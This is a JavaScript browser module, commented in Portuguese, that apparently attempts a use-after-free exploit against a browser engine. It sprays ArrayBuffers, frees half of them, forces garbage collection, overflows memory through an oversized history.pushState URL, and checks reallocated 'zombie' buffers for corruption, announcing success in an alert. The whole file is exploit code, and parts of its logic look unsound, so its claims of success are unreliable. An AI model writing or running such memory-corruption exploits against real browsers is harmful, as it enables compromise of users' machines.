/* MÓDULO: ZOMBIE ATTACK
   Foca no ataque Use-After-Free via JSON
*/

const BTN_ID = "btnZombie";
const LOG_ID = "log";

// Configuração Inicial
const btn = document.getElementById(BTN_ID);
if (btn) {
    btn.addEventListener("click", () => {
        uiLogger("--- Iniciando Módulo: ZOMBIE ATTACK ---");
        startZombieAttack();
    });
    console.log(`[Zombie Module] Atrelado ao botão #${BTN_ID}`);
} else {
    console.error(`[Zombie Module] Botão #${BTN_ID} não encontrado!`);
}

// --- LÓGICA DO ATAQUE ---

async function startZombieAttack() {
    const ALIGNED_OFFSET = 709520; 
    const OVERFLOW_AMT = 1024 * 64; 
    const TARGET_SIZE = 1024 * 1024; 
    const SPRAY_COUNT = 100;

    var victims = [];
    var zombies = [];

    uiLogger("1. Alocando Vítimas (ArrayBuffers)...");
    
    for(let i=0; i<SPRAY_COUNT; i++) {
        let ab = new ArrayBuffer(TARGET_SIZE);
        let view = new Uint8Array(ab);
        view[0] = 0xAA;
        victims.push(ab);
    }

    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }
    await forceGC();

    uiLogger("2. Disparando Overflow...");
    
    setTimeout(() => {
        try {
            let buffer = "A".repeat(ALIGNED_OFFSET);
            buffer += "\x01".repeat(OVERFLOW_AMT);
            
            let bigJson = { data: "J".repeat(1024 * 512) };

            history.pushState(bigJson, "zombie", "/" + buffer);

            uiLogger("3. Fake Free (Forçando GC)...");
            victims = null; 

            forceGC().then(() => {
                uiLogger("4. Invocando Zumbis...");
                checkZombies(zombies, TARGET_SIZE);
            });

        } catch (e) {
            uiLogger("Erro: " + e.message);
        }
    }, 500);
}

function checkZombies(zombies, size) {
    for(let i=0; i<50; i++) {
        let ab = new ArrayBuffer(size);
        let view = new Uint8Array(ab);
        view[0] = 0xBB;
        zombies.push(ab);
    }

    let success = false;
    for(let i=0; i<zombies.length; i++) {
        let view = new Uint8Array(zombies[i]);
        if (view[0] === 1 || view[0] === 0xAA) {
                uiLogger(`!!! SUCESSO !!! Zumbi ${i} nasceu corrompido!`, 'win');
                alert("USE-AFTER-FREE ACHIEVED!");
                success = true;
        }
    }

    if (!success) uiLogger("Nenhum zumbi detectado.");
}

async function forceGC() {
    try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 800));
}

function uiLogger(msg, type) {
    const el = document.getElementById(LOG_ID);
    let style = type === 'win' ? 'class="win"' : '';
    el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}